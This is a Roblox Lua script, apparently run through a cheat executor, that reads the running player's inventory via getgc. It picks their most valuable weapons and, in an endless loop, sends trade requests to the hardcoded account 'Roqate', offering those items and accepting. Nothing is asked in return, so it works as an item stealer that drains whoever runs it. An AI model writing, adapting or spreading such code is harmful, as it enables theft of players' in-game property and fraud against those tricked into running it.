local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.5
local UI_WAIT_TIMEOUT = 10
local ACCEPT_WAIT_TIMEOUT = 20

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Inventory Functions ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Inventory not found!")
        return {}
    end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)

    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === UI Detection ===
local function waitForTradeGUI()
    local startTime = os.clock()
    while os.clock() - startTime < UI_WAIT_TIMEOUT do
        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if gui then
            for _, label in ipairs(gui:GetDescendants()) do
                if label:IsA("TextLabel") and string.find(string.lower(label.Text), "your offer") then
                    return gui
                end
            end
        end
        task.wait(0.2)
    end
    return nil
end

local function isItemVisible(gui, itemName)
    local searchName = string.lower(itemName)
    for _, descendant in ipairs(gui:GetDescendants()) do
        if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and descendant.Text then
            if string.find(string.lower(descendant.Text), searchName) then
                return true
            end
        end
    end
    return false
end

-- === Trade Actions ===
local function addAllItems(gui, weapons)
    print("\n➕ Adding items:")
    for _, weapon in ipairs(weapons) do
        print("   - Attempting to add:", weapon)
        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
end

local function verifyItemsVisible(gui, weapons)
    print("\n🔍 Verifying items:")
    local allVisible = true
    for _, weapon in ipairs(weapons) do
        if isItemVisible(gui, weapon) then
            print("   ✓", weapon)
        else
            print("   ❌", weapon, "(not visible)")
            allVisible = false
        end
    end
    return allVisible
end

local function waitForOtherAccept(gui)
    local startTime = os.clock()
    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
        for _, label in ipairs(gui:GetDescendants()) do
            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
                return true
            end
        end
        
        if not gui.Parent then
            return true
        end
        
        task.wait(0.5)
    end
    return false
end

-- === Main Trade Cycle ===
local function doTradeCycle(targetPlayer)
    print("\n═════════ Starting Trade Cycle ═════════")
    local weapons = getTop4Weapons()
    if #weapons == 0 then return end
    
    print("🎯 Target:", targetPlayer.Name)
    print("📦 Items to trade:", table.concat(weapons, ", "))

    -- Send trade request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not success then
        warn("❌ Trade request failed:", err)
        return
    end
    print("✅ Trade request sent")

    -- Wait for trade GUI
    local gui = waitForTradeGUI()
    if not gui then
        warn("⚠ Trade GUI not found!")
        return
    end
    print("✅ Trade GUI found")

    -- Add all items regardless
    addAllItems(gui, weapons)

    -- Verify items are actually visible on screen
    if verifyItemsVisible(gui, weapons) then
        print("✅ All items visible - proceeding with trade")
        
        -- Wait for other player to accept
        print("\n⏳ Waiting for other player to accept...")
        if waitForOtherAccept(gui) then
            print("✅ Other player accepted - completing trade")
            TradeRemotes.AcceptTrade:FireServer()
        else
            warn("⚠ Timeout waiting for acceptance!")
        end
    else
        warn("⚠ Not all items visible - trade may fail!")
    end

    -- Wait for trade to complete (GUI to close)
    print("\n🔄 Waiting for trade to complete...")
    local startTime = os.clock()
    while gui and gui.Parent and os.clock() - startTime < 5 do
        task.wait(0.5)
    end
    print("✅ Trade cycle completed\n")
end

-- === Main Loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "...")
    end
    task.wait(TRADE_COOLDOWN)
end
